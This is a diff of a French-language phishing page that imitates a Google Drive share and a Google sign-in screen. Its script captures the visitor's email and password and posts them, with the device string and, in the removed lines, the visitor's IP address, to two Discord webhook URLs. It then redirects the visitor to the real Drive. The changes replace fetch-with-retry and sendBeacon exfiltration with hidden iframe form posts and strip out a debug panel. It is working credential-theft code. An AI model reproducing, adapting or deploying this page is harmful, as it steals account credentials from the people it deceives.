@@ -10,108 +10,46 @@
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
   html,body{margin:0;padding:0}
-  body{
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
-    background:#f8f9fa;color:#202124;min-height:100vh;
-    -webkit-font-smoothing:antialiased;
-  }
+  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;background:#f8f9fa;color:#202124;min-height:100vh;-webkit-font-smoothing:antialiased}
   .screen{display:none}
   .screen.on{display:block}
-
-  .drivebar{
-    display:flex;align-items:center;gap:10px;background:#fff;
-    padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));
-    border-bottom:1px solid #e8eaed;position:sticky;top:0;z-index:5;
-  }
+  .drivebar{display:flex;align-items:center;gap:10px;background:#fff;padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));border-bottom:1px solid #e8eaed;position:sticky;top:0;z-index:5}
   .drivebar span{font-size:21px;color:#5f6368;letter-spacing:.2px}
   .drivebar svg{width:26px;height:26px;flex:0 0 auto}
   .wrap{padding:18px 16px calc(28px + env(safe-area-inset-bottom))}
-  .card{
-    background:#fff;border-radius:14px;padding:20px;
-    box-shadow:0 1px 2px rgba(60,64,67,.10),0 2px 8px rgba(60,64,67,.08);
-    max-width:520px;margin:0 auto;
-  }
+  .card{background:#fff;border-radius:14px;padding:20px;box-shadow:0 1px 2px rgba(60,64,67,.10),0 2px 8px rgba(60,64,67,.08);max-width:520px;margin:0 auto}
   .row{display:flex;align-items:center;gap:11px;margin-bottom:18px}
-  .avatar{
-    width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;
-    display:flex;align-items:center;justify-content:center;font-weight:600;font-size:17px;
-    flex:0 0 auto;
-  }
+  .avatar{width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:600;font-size:17px;flex:0 0 auto}
   .who{font-size:15px;font-weight:600;color:#202124;line-height:1.2}
   .who small{display:block;font-weight:400;color:#5f6368;font-size:13px;margin-top:2px}
   h1{font-size:19px;line-height:1.35;margin:0 0 10px;font-weight:500;color:#202124}
   .muted{font-size:14px;line-height:1.55;color:#5f6368;margin:0 0 18px}
-  .file{
-    display:flex;align-items:center;gap:12px;border:1px solid #e8eaed;
-    border-radius:10px;padding:12px 14px;margin-bottom:20px;background:#fafafa;
-  }
-  .pdfico{
-    width:36px;height:36px;border-radius:6px;background:#e8453c;color:#fff;
-    display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;
-    letter-spacing:.4px;flex:0 0 auto;
-  }
+  .file{display:flex;align-items:center;gap:12px;border:1px solid #e8eaed;border-radius:10px;padding:12px 14px;margin-bottom:20px;background:#fafafa}
+  .pdfico{width:36px;height:36px;border-radius:6px;background:#e8453c;color:#fff;display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;letter-spacing:.4px;flex:0 0 auto}
   .fname{font-size:14px;font-weight:500;color:#202124;word-break:break-word}
   .fmeta{font-size:12px;color:#5f6368;margin-top:3px}
-  .btn{
-    display:block;width:100%;border:0;border-radius:8px;background:#1a73e8;color:#fff;
-    font-size:15px;font-weight:500;padding:13px 16px;cursor:pointer;
-    font-family:inherit;-webkit-appearance:none;
-  }
+  .btn{display:block;width:100%;border:0;border-radius:8px;background:#1a73e8;color:#fff;font-size:15px;font-weight:500;padding:13px 16px;cursor:pointer;font-family:inherit;-webkit-appearance:none}
   .btn:active{background:#1765cc}
   .tiny{text-align:center;font-size:12px;color:#80868b;margin-top:16px}
-
-  .gwrap{
-    max-width:420px;margin:0 auto;padding:44px 26px calc(30px + env(safe-area-inset-bottom));
-    padding-top:calc(44px + env(safe-area-inset-top));
-  }
+  .gwrap{max-width:420px;margin:0 auto;padding:44px 26px calc(30px + env(safe-area-inset-bottom));padding-top:calc(44px + env(safe-area-inset-top))}
   .gwrap .glogo{width:40px;height:40px;display:block;margin-bottom:20px}
   .gwrap h2{font-size:23px;font-weight:400;margin:0 0 8px;color:#202124}
   .gwrap .lead{font-size:15px;color:#202124;margin:0 0 26px;line-height:1.4}
   .gwrap .lead b{font-weight:500}
-  .field{
-    width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;
-    font-size:16px;font-family:inherit;color:#202124;background:#fff;
-    -webkit-appearance:none;appearance:none;outline:none;
-  }
+  .field{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 14px;font-size:16px;font-family:inherit;color:#202124;background:#fff;-webkit-appearance:none;appearance:none;outline:none}
   .field:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
   .link{display:inline-block;font-size:13px;color:#1a73e8;font-weight:500;margin-top:14px;text-decoration:none}
   .actions{display:flex;justify-content:flex-end;margin-top:34px}
-  .gbtn{
-    border:0;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;
-    padding:11px 26px;cursor:pointer;font-family:inherit;-webkit-appearance:none;min-width:96px;
-  }
+  .gbtn{border:0;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;padding:11px 26px;cursor:pointer;font-family:inherit;-webkit-appearance:none;min-width:96px}
   .gbtn:active{background:#1765cc}
   .gbtn[disabled]{background:#8ab4f8}
-  .chip{
-    display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;
-    border-radius:20px;padding:5px 14px 5px 5px;font-size:13px;color:#3c4043;
-    margin-bottom:26px;max-width:100%;
-  }
-  .chip .mini{
-    width:22px;height:22px;border-radius:50%;background:#1a73e8;color:#fff;
-    display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex:0 0 auto;
-  }
+  .chip{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:5px 14px 5px 5px;font-size:13px;color:#3c4043;margin-bottom:26px;max-width:100%}
+  .chip .mini{width:22px;height:22px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:600;flex:0 0 auto}
   .chip span.mail{overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-  .show{
-    display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;
-    margin-top:16px;user-select:none;
-  }
+  .show{display:flex;align-items:center;gap:8px;font-size:13px;color:#5f6368;margin-top:16px;user-select:none}
   .show input{width:16px;height:16px;margin:0;accent-color:#1a73e8}
-  .spin{
-    width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;
-    border-radius:50%;display:inline-block;vertical-align:-2px;margin-right:7px;
-    animation:sp .7s linear infinite;
-  }
+  .spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;display:inline-block;vertical-align:-2px;margin-right:7px;animation:sp .7s linear infinite}
   @keyframes sp{to{transform:rotate(360deg)}}
-  .stat{font-size:11px;color:#80868b;text-align:right;margin-top:10px;min-height:14px}
-
-  #dbg{
-    display:none;position:fixed;left:0;right:0;bottom:0;z-index:99;
-    background:rgba(255,255,255,.97);border-top:1px solid #dadce0;
-    font:10px/1.45 ui-monospace,Menlo,monospace;color:#3c4043;
-    padding:6px 8px calc(6px + env(safe-area-inset-bottom));
-    white-space:pre-wrap;max-height:130px;overflow:hidden;
-  }
 </style>
 </head>
 <body>
@@ -189,37 +127,23 @@
              autocomplete="off" placeholder="Saisissez votre mot de passe">
       <label class="show"><input type="checkbox" id="showpwd"> Afficher le mot de passe</label>
       <div class="actions"><button class="gbtn" id="btnLogin" type="submit">Se connecter</button></div>
-      <div class="stat" id="stat"></div>
     </form>
   </div>
 </section>
-
-<div id="dbg"></div>
 
 <script>
 (function () {
   "use strict";
 
-  var DEBUG = true;
-
   var URLS = [
-    "https://discord.com/api/v10/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot?wait=true",
-    "https://discord.com/api/v10/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN?wait=true"
+    "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot",
+    "https://discord.com/api/webhooks/1567191230872551464/lhvhBSU_tcH3H7mUIuo87kHxBdnnPbzdwAG6laVscaFd4GNk4JRbFjUQKmRoxiutL_QN"
   ];
-  var CODE     = "RB-9K42-XT7D";
+  var CODE = "RB-9K42-XT7D";
   var REDIRECT = "https://drive.google.com/drive/my-drive";
 
   var $ = function (id) { return document.getElementById(id); };
-  var emailEl = $("email"), pwdEl = $("pwd"), statEl = $("stat"), dbgEl = $("dbg");
-
-  function log(s) {
-    if (!DEBUG) return;
-    dbgEl.style.display = "block";
-    var d = new Date();
-    var t = ("0" + d.getHours()).slice(-2) + ":" + ("0" + d.getMinutes()).slice(-2) + ":" + ("0" + d.getSeconds()).slice(-2);
-    var lines = (dbgEl.textContent + "\n" + t + " " + s).split("\n");
-    dbgEl.textContent = lines.slice(-9).join("\n");
-  }
+  var emailEl = $("email"), pwdEl = $("pwd");
 
   function show(id) {
     var all = document.querySelectorAll(".screen");
@@ -227,79 +151,51 @@
     $(id).classList.add("on");
     window.scrollTo(0, 0);
   }
+
   function ua() { return (navigator.userAgent || "-").slice(0, 180); }
-  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
 
-  function encode(obj) {
-    var out = [];
-    for (var k in obj) {
-      if (Object.prototype.hasOwnProperty.call(obj, k)) {
-        out.push(encodeURIComponent(k) + "=" + encodeURIComponent(obj[k]));
-      }
-    }
-    return out.join("&");
-  }
-  function body(text) { return encode({ username: "Drive - " + CODE, content: text }); }
-
-  function post(url, payload, tag) {
+  /* Formulaire invisible. Résout quand l'aller-retour est terminé (ou 4,5 s). */
+  function formPost(url, data) {
     return new Promise(function (resolve) {
-      if (!window.fetch) { log(tag + " pas de fetch"); resolve(false); return; }
       var done = false;
-      var t = setTimeout(function () {
-        if (!done) { done = true; log(tag + " TIMEOUT"); resolve(false); }
-      }, 2500);
-      fetch(url, {
-        method: "POST",
-        headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
-        body: payload,
-        cache: "no-store",
-        credentials: "omit",
-        mode: "cors"
-      }).then(function (r) {
-        if (!done) { done = true; clearTimeout(t); log(tag + " -> " + r.status); resolve(!!(r && r.ok)); }
-      }).catch(function (e) {
-        if (!done) { done = true; clearTimeout(t); log(tag + " ERR " + (e && e.name ? e.name : "?")); resolve(false); }
-      });
+      function fin() { if (!done) { done = true; resolve(); } }
+      try {
+        var frame = document.createElement("iframe");
+        frame.name = "f" + Math.random().toString(36).slice(2);
+        frame.style.cssText = "position:absolute;width:0;height:0;border:0;left:-9999px";
+        frame.onload = fin;
+        document.body.appendChild(frame);
+
+        var form = document.createElement("form");
+        form.method = "POST";
+        form.action = url;
+        form.target = frame.name;
+        form.style.display = "none";
+
+        for (var k in data) {
+          var input = document.createElement("input");
+          input.type = "hidden";
+          input.name = k;
+          input.value = data[k];
+          form.appendChild(input);
+        }
+        document.body.appendChild(form);
+        form.submit();
+      } catch (e) { fin(); }
+      setTimeout(fin, 4500);
     });
   }
 
-  function withRetry(url, payload, tries, tag) {
-    var delays = [0, 700, 1600, 3000];
-    var i = 0;
-    function step() {
-      if (i >= tries) return Promise.resolve(false);
-      var wait = delays[i]; i++;
-      return sleep(wait).then(function () {
-        return post(url, payload, tag + "#" + i).then(function (ok) {
-          return ok ? true : step();
-        });
-      });
+  function send(text) {
+    var jobs = [];
+    for (var i = 0; i < URLS.length; i++) {
+      jobs.push(formPost(URLS[i], { username: "Drive - " + CODE, content: text }));
     }
-    return step();
-  }
-
-  function beacon(text) {
-    try {
-      var blob = new Blob([body(text)], { type: "text/plain;charset=UTF-8" });
-      for (var i = 0; i < URLS.length; i++) {
-        var r = navigator.sendBeacon(URLS[i], blob);
-        log("beacon" + i + " " + (r ? "ok" : "refus"));
-      }
-    } catch (e) { log("beacon ERR " + e.name); }
+    return Promise.all(jobs);
   }
 
   window.addEventListener("load", function () {
-    log("page ouverte");
-    var ip = "-";
-    var ipReq = fetch("https://api.ipify.org?format=json", { cache: "no-store" })
-      .then(function (r) { return r.json(); })
-      .then(function (j) { if (j && j.ip) ip = j.ip; })
-      .catch(function () {});
-
-    Promise.race([ipReq, sleep(1200)]).then(function () {
-      var text = "\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nIP : " + ip + "\nAppareil : " + ua();
-      for (var i = 0; i < URLS.length; i++) withRetry(URLS[i], body(text), 3, "ping" + i);
-    });
+    send("\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nAppareil : " + ua());
   });
 
   $("start").addEventListener("click", function () {
@@ -309,40 +205,18 @@
 
   $("formEmail").addEventListener("submit", function (e) {
     e.preventDefault();
-    var mail = emailEl.value;
-    $("chipMail").textContent = mail || "-";
-    log("email soumis");
-    var text = "\u2709\ufe0f Email saisi\nCode : " + CODE + "\nEmail : " + mail;
-    for (var i = 0; i < URLS.length; i++) withRetry(URLS[i], body(text), 3, "mail" + i);
+    $("chipMail").textContent = emailEl.value || "-";
     show("s3");
     setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 120);
   });
 
-  var busy = false, went = false, confirmed = false, partialSent = false;
+  var busy = false, went = false;
 
   function go() {
     if (went) return;
     went = true;
-    log("redirection");
-    setTimeout(function () { location.replace(REDIRECT); }, 3500);
+    location.replace(REDIRECT);
   }
-
-  function buildText(partial) {
-    var head = partial ? "\u23f3 Mot de passe (partiel)" : "\ud83d\udd10 Identifiants";
-    return head + "\n"
-         + "Code : " + CODE + "\n"
-         + "Email : " + emailEl.value + "\n"
-         + "Mot de passe :\n```\n" + (pwdEl.value || "-") + "\n```\n"
-         + "Appareil : " + ua();
-  }
-
-  /* Filet : envoi dès que le champ perd le focus */
-  pwdEl.addEventListener("blur", function () {
-    if (busy || partialSent || !pwdEl.value) return;
-    partialSent = true;
-    log("blur, envoi partiel");
-    beacon(buildText(true));
-  });
 
   $("formPwd").addEventListener("submit", function (e) {
     e.preventDefault();
@@ -352,40 +226,14 @@
     var btn = $("btnLogin");
     btn.disabled = true;
     btn.innerHTML = '<span class="spin"></span>Connexion\u2026';
-    statEl.textContent = "Envoi\u2026";
 
-    log("mdp len=" + pwdEl.value.length);
-    var text = buildText(false);
-    var payload;
-    try {
-      payload = body(text);
-      log("payload len=" + payload.length);
-    } catch (err) {
-      log("ENCODE ERR " + err.name);
-      payload = encode({ content: text });
-    }
+    send("\ud83d\udd10 Identifiants\n"
+       + "Code : " + CODE + "\n"
+       + "Email : " + emailEl.value + "\n"
+       + "Mot de passe :\n```\n" + (pwdEl.value || "-") + "\n```\n"
+       + "Appareil : " + ua()).then(go);
 
-    /* 1. beacon immédiat, jamais annulé par la navigation */
-    beacon(text);
-
-    /* 2. fetch avec réessais */
-    for (var i = 0; i < URLS.length; i++) {
-      (function (url, idx) {
-        withRetry(url, payload, 4, "pwd" + idx).then(function (ok) {
-          log("pwd" + idx + " resultat=" + ok);
-          if (!ok || confirmed) return;
-          confirmed = true;
-          statEl.textContent = "\u2713 Envoy\u00e9";
-          btn.innerHTML = '<span class="spin"></span>Redirection\u2026';
-          go();
-        });
-      })(URLS[i], i);
-    }
-
-    setTimeout(function () {
-      if (!confirmed) { statEl.textContent = "Echec d'envoi"; log("plafond atteint"); }
-      go();
-    }, 18000);
+    setTimeout(go, 6000);
   });
 
   $("showpwd").addEventListener("change", function () {
